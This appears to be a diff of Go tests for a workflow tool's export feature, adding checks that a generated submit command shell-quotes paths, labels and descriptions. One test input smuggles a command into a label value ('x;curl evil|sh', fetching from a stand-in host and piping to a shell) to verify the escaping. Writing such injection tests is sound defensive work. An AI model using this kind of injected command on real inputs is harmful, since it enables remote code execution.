@@ -131,13 +131,49 @@ func TestExportWritesTheKeptFilesVerbatim(t *testing.T) {
 		t.Errorf("manifest = %+v, want the run's identity and note", manifest)
 	}
 
-	want := `pumbaa workflow submit -w workflow.wdl -i inputs.json -o options.json -d dependencies.zip -l owner=lucas -D "smoke test"`
+	want := `pumbaa workflow submit -w workflow.wdl -i inputs.json -o options.json -d dependencies.zip -l owner=lucas -D 'smoke test'`
 	if out.SubmitCommand != want {
 		t.Errorf("submit command = %q, want %q", out.SubmitCommand, want)
 	}
 
 	if len(out.Secrets) != 1 || out.Secrets[0] != "user_service_account_json" || out.SecretsStripped {
 		t.Errorf("Secrets = %v stripped=%v, want the credential key reported and left in place", out.Secrets, out.SecretsStripped)
+	}
+}
+
+func TestExportQuotesTheSubmitCommandForTheShell(t *testing.T) {
+	out := &ExportRunOutput{
+		Dir:         "/data/my runs/it's here",
+		Description: "budget $5 run, `date` included\nsecond line",
+		Labels:      map[string]string{"owner": "x;curl evil|sh", "project": "rnaseq"},
+		Files:       []ExportedFile{{Kind: ports.RunFileWorkflow, Name: ExportWorkflowName}},
+	}
+	out.SubmitCommand = submitCommand(out)
+
+	want := `pumbaa workflow submit -w workflow.wdl -l 'owner=x;curl evil|sh' -l project=rnaseq -D 'budget $5 run, ` + "`date`" + ` included` + "\n" + `second line'`
+	if out.SubmitCommand != want {
+		t.Errorf("submit command = %q, want %q", out.SubmitCommand, want)
+	}
+	if got, want := out.ResubmitCommand(), `cd '/data/my runs/it'\''s here' && `+want; got != want {
+		t.Errorf("resubmit command = %q, want %q", got, want)
+	}
+}
+
+func TestShellQuote(t *testing.T) {
+	for in, want := range map[string]string{
+		"workflow.wdl":     "workflow.wdl",
+		"owner=lucas":      "owner=lucas",
+		"gs://b/x,y@z%2+1": "gs://b/x,y@z%2+1",
+		"":                 "''",
+		"two words":        "'two words'",
+		"it's":             `'it'\''s'`,
+		"~/runs":           "'~/runs'",
+		"=ls":              "'=ls'",
+		"a*b":              "'a*b'",
+	} {
+		if got := shellQuote(in); got != want {
+			t.Errorf("shellQuote(%q) = %s, want %s", in, got, want)
+		}
 	}
 }
 
